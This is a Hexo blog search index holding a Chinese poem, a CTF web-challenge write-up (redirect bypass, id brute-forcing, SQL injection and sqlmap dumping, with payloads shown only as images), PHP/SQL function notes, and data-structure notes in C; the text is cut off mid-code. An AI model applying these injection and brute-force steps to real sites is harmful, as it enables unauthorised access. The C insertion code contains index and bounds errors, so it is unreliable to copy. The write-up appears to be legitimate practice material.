<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>洛阳</title>
    <url>/2022/08/13/%E9%95%BF%E5%AE%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>《你要写月，就不能只写月》仿写——历历山河</p>
<span id="more"></span>
<p>你要写洛阳，就不能只写洛阳</p>
<p>要写盛唐，写浮光<br>写这天下之众的攘攘与如霜</p>
<p>要写玉楼金阙拂衣裳，诗酒华章<br>写纸贵绝唱，写家书两行，<br>写一位陌上看花的冰心少年郎</p>
<p>写此夜玉笛声回荡，写满是京城牡丹香<br>再写白驹过隙梦黄粱，人世间茫茫</p>
<p>罢笔之时，欲晚天光<br>惊觉此身感秋凉，锦绣意气仍朗朗<br>当时只道是寻常</p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>web攻防</title>
    <url>/2022/08/15/web%E6%94%BB%E9%98%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>每天几道题</p>
<span id="more"></span>
<h2 id="第一题——baby-web"><a href="#第一题——baby-web" class="headerlink" title="第一题——baby_web"></a>第一题——baby_web</h2><p>掌握web相应包头部常见参数</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101339517.png" alt="题目"></p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101408887.png" alt="打开后的图片"></p>
<p>根据题目描述考虑index.php页面，但是打开网页后直接跳转到了1.php，抓包得到</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101555331.png" alt></p>
<p>扔到reperter模块，修改1.php为index.php</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101647686.png" alt></p>
<p>看到旗帜被隐藏，看hex得到</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101726805.png" alt></p>
<p>或者通过开发者工具，在网络中可以看到index被重定向了<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815120359827.png" alt></p>
<h2 id="第二题——ics-06"><a href="#第二题——ics-06" class="headerlink" title="第二题——ics-06"></a>第二题——ics-06</h2><p>id爆破</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103134706.png" alt="题目"></p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103201798.png" alt="靶场"></p>
<p>点击很多个地方发现只有报表中心能点，里面内容为</p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103310739.png" alt></p>
<p>选了很多个日期发现没反应网页，后来发现改id是有反应的<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103352596.png" alt><br>明白了，爆破，先抓包再送去炸死这道阴间题<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103500026.png" alt></p>
<p>然后我就一百个数一百个数进行爆破，在2300-2400的时候报文长度不一样了<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103556967.png" alt><br>看结果获得旗帜<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103629272.png" alt></p>
<h2 id="第三题——ingnt"><a href="#第三题——ingnt" class="headerlink" title="第三题——ingnt"></a>第三题——ingnt</h2><p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115158896.png" alt="题目"></p>
<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115217584.png" alt="靶场"></p>
<p>没有什么可操作的地方除了地址框，猜测是sql注入<br>方法1：直接采用万能钥匙<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115337825.png" alt></p>
<p>方法二：sqlmap一把梭<br>先查数据库名<img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115419759.png" alt="image-20220815115419759"><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115447014.png" alt><br>查表名<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115506861.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115521175.png" alt><br>输出表中所有字段<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115600014.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115612711.png" alt><br>输出pw字段内容<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115639962.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115652969.png" alt><br>得到flag</p>
<p>直接一把梭<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115726708.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115746924.png" alt></p>
]]></content>
      <tags>
        <tag>网络攻防</tag>
        <tag>实例</tag>
      </tags>
  </entry>
  <entry>
    <title>函数库</title>
    <url>/2022/08/18/%E5%87%BD%E6%95%B0%E5%BA%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学习过程中遇到的一些不认识的函数的学习积累</p>
<span id="more"></span>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">格式<span class="number">1</span>：limit<span class="operator">&lt;</span>参数值<span class="operator">&gt;</span></span><br><span class="line">查询前<span class="operator">&lt;</span>参数值<span class="operator">&gt;</span>行的数据</span><br><span class="line"></span><br><span class="line">格式<span class="number">2</span>：limit<span class="operator">&lt;</span>参数值a<span class="operator">&gt;</span>,<span class="operator">&lt;</span>参数值b<span class="operator">&gt;</span></span><br><span class="line">查询从第<span class="operator">&lt;</span>参数值a<span class="operator">&gt;</span>行开始共<span class="operator">&lt;</span>参数值b<span class="operator">&gt;</span>条的数据</span><br></pre></td></tr></table></figure>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">获取图像大小及相关信息，成功返回一个数组，失败返回false并产生一条E_WARNING级错误信息</span><br><span class="line">其输出的数组为：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] <span class="operator">=</span>&gt; <span class="number">290</span></span><br><span class="line">    [<span class="number">1</span>] <span class="operator">=</span>&gt; <span class="number">69</span></span><br><span class="line">    [<span class="number">2</span>] <span class="operator">=</span>&gt; <span class="number">3</span></span><br><span class="line">    [<span class="number">3</span>] <span class="operator">=</span>&gt; width<span class="operator">=</span><span class="string">&quot;290&quot;</span> height<span class="operator">=</span><span class="string">&quot;69&quot;</span></span><br><span class="line">    [bits] <span class="operator">=</span>&gt; <span class="number">8</span></span><br><span class="line">    [mime] <span class="operator">=</span>&gt; image/png</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">返回结果说明</span><br><span class="line"></span><br><span class="line">索引 <span class="number">0</span> 给出的是图像宽度的像素值</span><br><span class="line">索引 <span class="number">1</span> 给出的是图像高度的像素值</span><br><span class="line">索引 <span class="number">2</span> 给出的是图像的类型，返回的是数字，其中<span class="number">1</span> <span class="operator">=</span> GIF，<span class="number">2</span> <span class="operator">=</span> JPG，<span class="number">3</span> <span class="operator">=</span> PNG，<span class="number">4</span> <span class="operator">=</span> SWF，<span class="number">5</span> <span class="operator">=</span> PSD，<span class="number">6</span> <span class="operator">=</span> BMP，<span class="number">7</span> <span class="operator">=</span> TIFF(intel byte order)，<span class="number">8</span> <span class="operator">=</span> TIFF(motorola byte order)，<span class="number">9</span> <span class="operator">=</span> JPC，<span class="number">10</span> <span class="operator">=</span> JP2，<span class="number">11</span> <span class="operator">=</span> JPX，<span class="number">12</span> <span class="operator">=</span> JB2，<span class="number">13</span> <span class="operator">=</span> SWC，<span class="number">14</span> <span class="operator">=</span> IFF，<span class="number">15</span> <span class="operator">=</span> WBMP，<span class="number">16</span> <span class="operator">=</span> XBM</span><br><span class="line">索引 <span class="number">3</span> 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签</span><br><span class="line">索引 bits 给出的是图像的每种颜色的位数，二进制格式</span><br><span class="line">索引 channels 给出的是图像的通道值，RGB 图像默认是 <span class="number">3</span></span><br><span class="line">索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(<span class="string">&quot;Content-type: image/jpeg&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h3 id="strrpos"><a href="#strrpos" class="headerlink" title="strrpos"></a>strrpos</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">strrpos</span>(<span class="keyword">string</span>,find,start)</span><br><span class="line"><span class="number">1</span>.<span class="keyword">string</span>：必需。规定被搜索的字符串。</span><br><span class="line"><span class="number">2</span>.find：必需。规定要查找的字符。</span><br><span class="line"><span class="number">3</span>.start：可选。规定在何处开始搜索。</span><br><span class="line">    </span><br><span class="line">相关函数：</span><br><span class="line">    <span class="title function_ invoke__">stripos</span>()-查找字符串在另一字符串中第一次出现的位置（不区分大小写）</span><br><span class="line">    <span class="title function_ invoke__">strpos</span>()-查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line">    <span class="title function_ invoke__">strripos</span>()-查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br></pre></td></tr></table></figure>
<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">格式<span class="number">1</span>：<span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span><br><span class="line">    <span class="number">1</span>、<span class="keyword">string</span> 需要截取的字符串 </span><br><span class="line">    <span class="number">2</span>、a 截取字符串的开始位置（注：当a等于<span class="number">0</span>或<span class="number">1</span>时，都是从第一位开始截取）</span><br><span class="line">    <span class="number">3</span>、b 要截取的字符串的长度</span><br><span class="line"></span><br><span class="line">格式<span class="number">2</span>：<span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,<span class="keyword">int</span> a)</span><br><span class="line">    <span class="number">1</span>、<span class="keyword">string</span> 需要截取的字符串</span><br><span class="line">    <span class="number">2</span>、a 可以理解为从第a个字符开始截取后面所有的字符串。</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,<span class="number">1</span>,<span class="number">3</span>); <span class="comment">//返回结果：aka</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>); <span class="comment">//返回结果：kal，截取从“e”开始3个字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,<span class="number">0</span>,<span class="number">100</span>); <span class="comment">//返回结果：akali，100虽然超出预处理的字符串最长度，但不会影响返回结果，系统按预处理字符串最大数量返回。</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali !&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>); <span class="comment">//返回结果：i ! (中间的空格也算一个字符串)</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">1</span>,<span class="number">3</span>); <span class="comment">//返回结果：i （从后面倒数第一位开始往后取1个字符，而不是3个。）</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">2</span>,<span class="number">3</span>); <span class="comment">//返回结果：li （从后面倒数第二位开始往后取2个字符，而不是3个。原因：下面红色 第三个注解）</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">3</span>,<span class="number">3</span>); <span class="comment">//返回结果：ali （从后面倒数第三位开始往后取3个字符）</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27;akali&#x27;</span>,-<span class="number">4</span>,<span class="number">3</span>); <span class="comment">//返回结果：ali （从后面倒数第四位开始往后取3个字符）</span></span><br><span class="line"></span><br><span class="line">注：最后几个奇奇怪怪的原因是要满足下面规则：</span><br><span class="line">|a| ≤ b,取a的个数；当 |a| ≥ b时，才取b的个数，由a决定截取位置）</span><br><span class="line"></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,<span class="number">1</span>);  <span class="comment">//返回结果： akali，截取所有字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,<span class="number">2</span>);  <span class="comment">//返回结果：kali，截取从“k”开始之后所有字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,<span class="number">3</span>);  <span class="comment">//返回结果：ali，截取从“a”开始之后所有字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,-<span class="number">1</span>);  <span class="comment">//返回结果：i，从最后一个“i”开始，反向截取1个字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,-<span class="number">2</span>);  <span class="comment">//返回结果：li，从最后一个“i”开始，反向截取2个字符</span></span><br><span class="line">select <span class="title function_ invoke__">substr</span>(<span class="string">&#x27; akali&#x27;</span>,-<span class="number">3</span>);  <span class="comment">//返回结果：ali，从最后一个“i”开始，反向截取3个字符 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构总纲</title>
    <url>/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>数据结构所有知识点汇总<br><span id="more"></span></p>
<h1 id="第零章——相关知识"><a href="#第零章——相关知识" class="headerlink" title="第零章——相关知识"></a>第零章——相关知识</h1><h2 id="卡特兰数"><a href="#卡特兰数" class="headerlink" title="卡特兰数"></a>卡特兰数</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220916175036035.png" alt></p>
<h1 id="第一章——绪论"><a href="#第一章——绪论" class="headerlink" title="第一章——绪论"></a>第一章——绪论</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>数据：信息的载体，被<strong>计算机程序识别和处理</strong>的符号的集合</p>
<p>数据元素：数据的<strong>基本单位</strong>，作为一个整体进行考虑和处理。可由若干<strong>数据项</strong>组成，数据项时构成数据元素的不可分割的<strong>最小单位</strong></p>
<p>组合项：由更细分的属性组成的数据项</p>
<p>数据对象：具有<strong>相同性质的数据元素的集合</strong>，是数据的一个子集</p>
<p>数据结构：相互之间存在一种或多种特定关系的数据元素的集合</p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>对特定问题求解步骤的一种描述</p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>​           有穷性：算法是有穷的，程序可以是无穷的（死循环不是算法）</p>
<p>​           确定性：相同的输入只能得到相同的输出</p>
<p>​           可行性</p>
<p>​           输入：0个或多个</p>
<p>​           输出：1个或多个</p>
<h3 id="好算法的特质"><a href="#好算法的特质" class="headerlink" title="好算法的特质"></a>好算法的特质</h3><p>​            正确性</p>
<p>​            可读性</p>
<p>​            健壮性：输入非法数据时，能适当作出反应进行处理</p>
<p>​            高效率，低存储需求：时间空间复杂度低</p>
<h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>常对幂指阶</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220916175113938.png" alt></p>
<p>考虑数量级</p>
<script type="math/tex; mode=display">
T(n)=O(f(n)) \Leftrightarrow \lim\limits_{n\rightarrow\infty}\frac{T(n)}{f(n)}</script><p>加法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n))</script><p>乘法</p>
<script type="math/tex; mode=display">
T(n)=T_1(n)*T_2(n)=O(f(n))*O(g(n))=O(f(n)*g(n))</script><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>越高级的语言执行效率越低</p>
<h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>函数递归调用带来的内存开销，递归调用深度x与问题规模n的关系：x=f（n）</p>
<h3 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h3><p>逻辑结构        数据运算        存储结构</p>
<h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520173636636.png" alt="image-20220520173636636" style="zoom: 80%;"></p>
<p>集合：数据元素同属于一个集合，没有其他关系</p>
<p>线性结构  ：只存在一对一的关系</p>
<p>树形结构  ：存在一对多的关系</p>
<p>网状结构或图状结构：存在多对多的关系</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520173714417.png" alt="image-20220520173714417" style="zoom:80%;"></p>
<h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p>1）顺序存储：逻辑上相邻物理上也相邻</p>
<p>2）链式存储：借助指针来表示元素之间的逻辑关系</p>
<p>3）索引存储：建立附加的索引表，索引项的一般形式（关键字，地址）</p>
<p>4）散列存储：哈希存储，根据元素的关键字</p>
<h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>1.可以用（）定义一个完整的数据结构                  <strong>D</strong></p>
<p>   A.数据元素    B.数据对象    C.数据关系    D.抽象数据结构</p>
<p>2.数据结构的说法中，正确的（）                        <strong>A</strong></p>
<p>​    A.数据的逻辑结构独立于其存储结构       </p>
<p>​    B.数据的存储结构独立于其逻辑结构                //存储结构是逻辑结构在计算机上的映射</p>
<p>​    C.数据的逻辑结构唯一决定其存储结构</p>
<p>​    D.数据结构仅由其逻辑结构和存储结构决定</p>
<p>3.<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520173954229.png" alt="image-20220520173954229">                <strong>A</strong></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520174012046.png" alt="image-20220520174012046"></p>
<p>4.<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520174334183.png" alt="image-20220520174334183"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520174402447.png" alt="image-20220520174402447"></p>
<p>5.算法原地工作的含义是指算法所需的辅助空间是常量。</p>
<p>   时间复杂度总是考虑最坏情况下的时间复杂度，以保证算法的运行时间不会比它更长。</p>
<p>7.<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520182104382.png" alt="image-20220520182104382"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220520182039190.png" alt="image-20220520182039190"></p>
<h1 id="第二章——线性表"><a href="#第二章——线性表" class="headerlink" title="第二章——线性表"></a>第二章——线性表</h1><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>是一个<strong>有限</strong>序列=&gt;有次序  （所以整数按照递增排列，不是线性表）</p>
<p>直接前驱 </p>
<script type="math/tex; mode=display">
a_1 \leftarrow a_2</script><p>a1是a2的直接前驱</p>
<p>直接后继</p>
<script type="math/tex; mode=display">
a_1 \rightarrow a_2</script><p>a2是a1的直接后继</p>
<h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>引用型参数：需要对参数的修改结果需要带回来</p>
<h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p>用顺序存储的方式实现线性表——把逻辑上相邻的元素存储在物理位置也相邻的存储单元</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416212202152.png" alt="image-20220416212202152"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416212232241.png" alt="image-20220416212232241"></p>
<h3 id="静态存储"><a href="#静态存储" class="headerlink" title="静态存储"></a>静态存储</h3><p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//定义最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];   <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;   <span class="comment">//顺序表当前元素长度</span></span><br><span class="line">&#125;SqList;   <span class="comment">//顺序表类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		L.data[i]=<span class="number">0</span>;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d\n&quot;</span>,i,L.data[i]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220415214246742.png" alt="image-20220415214246742"></p>
<p><strong>正常访问应该是i&lt;L.length，并且Length = 0是不可省略的</strong></p>
<h3 id="动态存储"><a href="#动态存储" class="headerlink" title="动态存储"></a>动态存储</h3><p>malloc函数用于申请空间</p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> *data;  <span class="comment">//指示动态分配数组的指针</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的当前长度</span></span><br><span class="line">	<span class="type">int</span> maxsize;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initlist</span><span class="params">(sqlist &amp;L)</span>&#123;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>(initsize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	L.length = <span class="number">0</span>;</span><br><span class="line">	L.maxsize = initsize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加表长</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">increaselist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> *p = L.data;</span><br><span class="line">	L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>((L.maxsize+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">		L.data[i] = p[i];</span><br><span class="line">	&#125;</span><br><span class="line">	L.maxsize = L.maxsize+len;</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	initlist(L);</span><br><span class="line">	increaselist(L,<span class="number">5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416211821527.png" alt="image-20220416211821527"></p>
<p>realloc函数也可以实现上述过程</p>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416213252923.png" alt="image-20220416213252923"></p>
<p><code>代码</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">insertlist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>)  <span class="comment">//判断i的范围是否有效</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(L.length&gt;maxsize)  <span class="comment">//判断数组是否已满</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length;j&gt;=i;j--)</span><br><span class="line">		L.data[j]=L.data[j<span class="number">-1</span>];</span><br><span class="line">	L.data[i]=e;</span><br><span class="line">	L.length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sqlist L;</span><br><span class="line">	insertlist(L,<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插入操作的时间复杂度</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220416214334739.png" alt="image-20220416214334739"></p>
<p>平均循环复杂度  =  O(n)</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line">	<span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span 